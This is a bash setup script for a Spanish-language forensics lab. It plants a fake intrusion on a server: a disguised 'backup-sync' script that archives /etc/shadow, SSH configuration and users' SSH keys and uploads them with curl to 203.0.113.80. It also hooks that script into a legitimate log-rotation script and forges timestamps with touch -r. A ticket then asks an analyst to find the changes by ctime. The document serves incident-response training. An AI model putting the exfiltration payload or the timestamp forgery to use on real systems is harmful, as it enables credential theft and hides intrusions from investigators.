#!/usr/bin/env bash
# Lab 118: el intruso deja un script nuevo y modifica uno legítimo para que lo
# llame. A los dos les copia la fecha de un vecino (touch -r): con ls -l
# parecen de 2023. Pero touch no puede tocar el ctime.
set -e
sha256sum /usr/local/bin/rotate-logs | cut -d' ' -f1 > /opt/lab/.ref-rotate; chmod 0600 /opt/lab/.ref-rotate
# Último cambio autorizado: el despliegue de hoy (sólo tocó la config de la app).
mkdir -p /var/log/deploy /etc/app
echo "workers=4" > /etc/app/app.conf
echo "$(date '+%F %T') despliegue v2.14: /etc/app/app.conf (sin cambios en /usr/local/bin) OK" > /var/log/deploy/ultimo.log
sleep 3   # la intrusión llega después del despliegue

cat > /usr/local/bin/backup-sync <<'X'
#!/bin/bash
# Sincroniza copias con el almacenamiento externo.
tar -czf /var/tmp/.s.tgz /etc/passwd /etc/shadow /etc/ssh /home/*/.ssh 2>/dev/null
curl -s -m 5 -T /var/tmp/.s.tgz http://203.0.113.80:8080/u/$(hostname) >/dev/null 2>&1
rm -f /var/tmp/.s.tgz
X
chmod 0755 /usr/local/bin/backup-sync
touch -r /usr/local/bin/rotate-logs /tmp/.m
sed -i '/^set -e/a /usr/local/bin/backup-sync \&' /usr/local/bin/rotate-logs
touch -r /usr/local/bin/backup-db /usr/local/bin/backup-sync
touch -r /tmp/.m /usr/local/bin/rotate-logs; rm -f /tmp/.m

mkdir -p /home/analista/ticket
cat > /home/analista/ticket/INC-118.txt <<'TXT'
INC-118 · srv-118
El EDR detectó hace un rato una subida de datos hacia 203.0.113.80 desde este
servidor. En /usr/local/bin todo "parece" de 2023 (ls -l). Encuentra qué se
creó o modificó HOY, aunque las fechas digan otra cosa, y deja los scripts
como estaban. Hay copia del despliegue en /var/backups/usr-local-bin.tar.gz.
El último cambio autorizado es el que registra /var/log/deploy/ultimo.log.
Anota en ~/fechas.txt cada fichero tocado y su ctime real.
TXT
chown -R analista:analista /home/analista/ticket
echo "Lab 118 plantado."
